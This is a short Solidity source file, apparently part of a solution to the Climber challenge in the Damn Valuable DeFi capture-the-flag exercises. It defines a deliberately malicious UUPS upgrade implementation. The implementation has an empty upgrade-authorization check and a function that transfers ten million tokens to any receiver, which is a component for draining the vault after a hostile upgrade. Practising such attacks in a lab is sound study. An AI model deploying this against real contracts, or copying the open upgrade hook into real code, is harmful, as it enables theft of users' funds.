// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract MaliciousImpl is UUPSUpgradeable{
    constructor() {}

    function malicious_transfer(address token, address receiver) public {
        DamnValuableToken(token).transfer(receiver, 10_000_000e18);
    }
    
    function _authorizeUpgrade(address newImplementation) internal override {}

    fallback() external payable {}
}